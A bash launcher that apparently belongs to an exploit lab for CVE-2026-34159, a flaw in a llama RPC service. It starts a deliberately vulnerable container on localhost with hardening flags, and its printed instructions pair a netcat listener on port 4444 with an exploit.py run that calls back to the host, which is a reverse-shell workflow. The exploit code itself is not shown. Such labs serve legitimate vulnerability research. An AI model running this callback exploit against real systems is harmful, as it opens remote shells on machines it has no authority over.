#!/usr/bin/env bash
set -euo pipefail

readonly IMAGE_NAME="${IMAGE_NAME:-llama-cve-2026-34159-exploit}"
readonly HOST_PORT="${HOST_PORT:-50053}"
readonly CONTAINER_NAME="${CONTAINER_NAME:-llama-cve-2026-34159-exploit-server}"

if ! docker image inspect "${IMAGE_NAME}" >/dev/null 2>&1; then
    echo "error: image not found: ${IMAGE_NAME} (run ./build.sh first)" >&2
    exit 1
fi
if docker container inspect "${CONTAINER_NAME}" >/dev/null 2>&1; then
    echo "error: container already exists: ${CONTAINER_NAME}" >&2
    echo "remove it explicitly before launching a new run" >&2
    exit 1
fi

echo "[*] starting vulnerable non-ASan RPC service on 127.0.0.1:${HOST_PORT}"
echo "[*] host.docker.internal is also available as the short callback name 'host'"
echo "[*] listener: nc -lvnp 4444"
echo "[*] exploit : python3 exploit.py host 4444 --target-port ${HOST_PORT}"
exec docker run \
    --name "${CONTAINER_NAME}" \
    --publish "127.0.0.1:${HOST_PORT}:50052" \
    --add-host host:host-gateway \
    --cap-drop ALL \
    --security-opt no-new-privileges \
    --read-only \
    --tmpfs /tmp:rw,nosuid,nodev,size=16m \
    "${IMAGE_NAME}"
